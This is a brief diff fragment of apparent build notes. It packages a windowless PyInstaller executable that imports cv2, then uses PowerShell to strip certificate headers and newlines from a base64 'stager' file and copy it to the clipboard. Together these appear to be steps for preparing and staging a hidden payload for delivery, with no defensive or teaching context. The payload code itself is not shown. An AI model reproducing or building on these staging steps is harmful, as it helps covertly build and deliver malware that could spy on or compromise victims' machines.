@@ -9,3 +9,6 @@ python -m PyInstaller --onefile --noconsole --hidden-import=cv2 --hidden-import=
 
 
 powershell -command "(Get-Content stager.b64 -Raw) -replace \"`r`n|`n|`r\", \"\" | Set-Content clean.txt"
+
+
+(Get-Content stager.b64 -Raw) -replace '(?s)-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----|\r?\n', '' -replace '\s+', '' | Set-Clipboard
